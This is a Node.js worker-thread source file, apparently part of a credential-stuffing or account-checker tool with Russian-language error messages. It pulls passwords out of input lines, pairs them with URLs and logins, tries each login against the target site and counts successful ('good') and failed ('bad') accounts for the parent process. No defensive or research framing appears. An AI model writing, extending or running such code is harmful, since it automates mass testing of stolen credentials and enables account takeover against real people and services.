const fs = require('fs');
const { parentPort } = require('worker_threads');
const { handleLogin } = require('./login');
const defineCombinations = require('./helpers/defineCombinations')
const findPasswords = require('./helpers/findPasswords')

const config = JSON.parse(fs.readFileSync('config.json', 'utf-8'));
const advanced_output = config.advanced_output;

async function handleLine(line, combinations) {
	let allGoodsCount = 0;
	let allBadsCount = 0;
	try {
		for (const [index, element] of combinations.entries()) {
		const { url, logins, passwords } = element;
			for (const [passwrodIndex, password] of passwords.entries()) {
				let {goodsCount, badsCount} = await handleLogin(url, logins?.map(l => l?.text), password, passwrodIndex * (combinations?.length || 0));
				allGoodsCount += goodsCount || 0
				allBadsCount += badsCount || 0
			}
		}
	} catch (error) {
		if (advanced_output) console.error(`Ошибка при входе в систему ${url}:`, error.message);
	}
	if (allGoodsCount) {
		parentPort?.postMessage({type: 'line_good' });
	} else if (allBadsCount) {
		parentPort?.postMessage({type: 'line_bad' });
	} else {
		parentPort?.postMessage({type: 'line_error' });
	}
	parentPort?.postMessage({type: 'line_done' });
}

async function main(lines) {
  try {
		const linesWithPasswords = findPasswords(lines);
		let linesWithCombinations = await defineCombinations(linesWithPasswords)
		for (const element of linesWithCombinations) {
			let {line, combinations} = element;
			await handleLine(line, combinations);
		}
	} catch (error) {
		parentPort?.postMessage({type: 'line_error' });
		if (advanced_output) console.error('Ошибка:', error?.message);
	} 
}

parentPort.on('message', async ({type, batch}) => {
	if (type && type == 'run') {
		await main(batch);
		parentPort?.postMessage({type: 'done', length: batch?.length });
	}
});